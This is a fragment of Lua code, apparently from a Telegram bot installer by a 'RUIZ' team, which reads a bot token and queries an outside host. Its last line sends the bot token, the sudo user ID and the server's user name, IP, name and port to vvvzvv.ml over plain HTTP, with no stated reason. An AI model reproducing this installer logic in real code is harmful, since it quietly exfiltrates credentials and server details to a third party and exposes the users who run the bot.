...
local token = io.read()
if token ~= '' then
data,res = https.request("https://vvvzvv.ml/index/RUIZ.php?p=RUIZTEAM")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://vvvzvv.ml/index/RUIZ.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://vvvzvv.ml/index/RUIZ.php?n=RUIZTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
